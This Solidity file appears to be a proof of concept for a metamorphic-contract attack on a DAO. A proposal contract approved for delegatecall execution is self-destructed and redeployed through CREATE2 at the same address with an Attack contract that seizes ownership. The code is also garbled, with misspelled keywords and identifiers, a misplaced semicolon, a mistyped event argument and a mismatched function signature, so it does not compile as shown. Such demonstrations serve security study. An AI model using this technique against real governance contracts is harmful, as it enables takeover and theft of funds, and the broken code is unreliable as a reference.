//SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.24;

contract DAO {
	

	struct Proposal {
		address target;
		bool approved;
		bool executed;
	}


	address public owner = msg.sender;
	Proposal[] public proposals;

	function approve(address target) external {
		require(msg.sender == owner, "not authorized");

		proposals.push(
			Proposal({
				target: target,
				approved: true,
				executed: false
			});
		)
	}

	function execute(uint256 proposalId) external payable {
		Proposal storage proposal = proposals[proposalId];
		require(proposal.approved, "not authorized");
		require(!proposal.executed, "executed");

		proposal.executed = true;

		(bool ok,) = proposal.target.delegatecall(abi.encodeWithSignature("executedProposal()") );

		require(ok,"delegatecall fail");
	}
}

contract Proposal {
	event Log(address addr);

	function executeProposal() external {
		emit Log("executed code approved by DAO");
	}

	function emergencyStop() external {
		selfDestruct(payable(address(0)));
	}
}


contract Attack {
	event Log(strnig message);

	address public owner;

	function executeProposal() external {
		emit Log("Executed code not approved by dao");
		owner = msg.sender;
	}
}


contract DeployerDeployer {
	event Log(address addr);

	function deploy()  external {
		bytes32 salt = keccak256(abi.encode(uint256(123)));
		address addr = address(new Deployer{salt: salt}());
		emit Log(addr);
	}
}


contract Deployer{
	evetn Log(address addr);

	function deployProposal() external {
		address addr = addreess(new Proposal());
		emit Log(addr);
	}

	function deployAttack() external {
		address addr = address (new Atack());
		emit Log(addr);
	}

	function kill() external {
		selfDestruct(payable(address(0)));
	}
}



	